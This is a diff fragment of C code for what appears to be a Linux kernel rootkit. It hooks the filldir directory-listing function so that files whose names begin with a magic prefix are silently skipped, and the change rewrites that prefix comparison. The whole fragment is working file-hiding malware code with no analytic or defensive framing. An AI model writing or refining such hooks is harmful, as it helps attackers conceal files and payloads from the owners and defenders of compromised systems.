@@ -6,8 +6,8 @@
 static asmlinkage int(*original_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
 static asmlinkage int filldir_hook(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
     // Hide files that start with the magic prefix
-    if (!strncmp(name, MAGIC_PREFIX, sizeof(MAGIC_PREFIX)-1)) {
-        return 0;  // Don't show this file
+    if (strncmp(name, MAGIC_PREFIX, strlen(MAGIC_PREFIX)) == 0) {
+        return 0;  // Don't show this file (skip it)
     }
 
     // Show all other files by calling the original function
